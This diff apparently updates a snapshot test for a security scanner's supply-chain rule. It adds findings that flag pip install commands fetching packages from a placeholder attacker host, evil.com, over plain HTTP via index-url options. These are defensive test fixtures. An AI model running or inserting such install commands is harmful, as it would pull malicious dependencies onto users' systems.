@@ -79,5 +79,27 @@ expression: findings
     "code": "pip install --trusted-host evil.com package",
     "message": "Package installation from untrusted or non-HTTPS source detected. This may introduce malicious dependencies.",
     "recommendation": "Use official package registries with HTTPS. Verify package integrity with checksums. Consider using lockfiles and dependency scanning."
+  },
+  {
+    "id": "SC-003",
+    "severity": "high",
+    "category": "supply_chain",
+    "confidence": "firm",
+    "name": "Untrusted package source",
+    "line": 12,
+    "code": "pip install --extra-index-url http://evil.com/pypi package",
+    "message": "Package installation from untrusted or non-HTTPS source detected. This may introduce malicious dependencies.",
+    "recommendation": "Use official package registries with HTTPS. Verify package integrity with checksums. Consider using lockfiles and dependency scanning."
+  },
+  {
+    "id": "SC-003",
+    "severity": "high",
+    "category": "supply_chain",
+    "confidence": "firm",
+    "name": "Untrusted package source",
+    "line": 13,
+    "code": "python -m pip install --index-url http://evil.com/simple package",
+    "message": "Package installation from untrusted or non-HTTPS source detected. This may introduce malicious dependencies.",
+    "recommendation": "Use official package registries with HTTPS. Verify package integrity with checksums. Consider using lockfiles and dependency scanning."
   }
 ]
